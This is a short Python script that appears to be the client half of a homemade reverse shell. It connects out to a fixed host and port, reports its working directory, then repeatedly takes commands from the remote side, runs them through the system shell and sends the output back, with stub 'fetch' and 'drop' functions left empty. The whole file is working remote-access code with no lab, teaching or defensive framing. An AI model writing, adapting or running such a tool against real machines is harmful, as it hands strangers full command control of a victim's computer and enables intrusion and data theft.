import socket 
import os 
import subprocess

HEADER_SIZE = 64
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!KILL"

SERVER_NAME = 'LAPTOP-BAVC5R5S'
SERVER = socket.gethostbyname(SERVER_NAME)
PORT = 1235
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg, encode = True):
	if encode:
		msg = msg.encode(FORMAT)
	
	msg_len = f"{len(msg):<{HEADER_SIZE}}".encode(FORMAT)

	client.send(msg_len)
	client.send(msg)

def recieve(): 
	msg_len = client.recv(HEADER_SIZE).decode(FORMAT)
	
	if msg_len:
		msg_len = int(msg_len)
		msg = client.recv(msg_len).decode(FORMAT)
		return msg

def cd(direct):
	try: 
		os.chdir(direct)
		return os.getcwd()
	except Exception as exception:
		return f"trying to change dir to {direct} raised {exception}"

def exec(command):
	try:
		ret = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE)
		return ret.stdout.read()
	except Exception as exception:
		return f"trying to excecute {command} raised {exception}".encode("850")

def fetch():
	pass

def drop():
	pass


def main():
	root = os.getcwd()
	send(root)
	while True:
		
		inp = recieve()
		
		if inp:
			if inp == DISCONNECT_MESSAGE:
				break  

			if inp[:2] == "cd":
				new_root = cd(inp[3:])
				send(new_root)
				continue

			out = exec(inp)
		
			send(out, encode = False)
		

if __name__ == "__main__":
	main()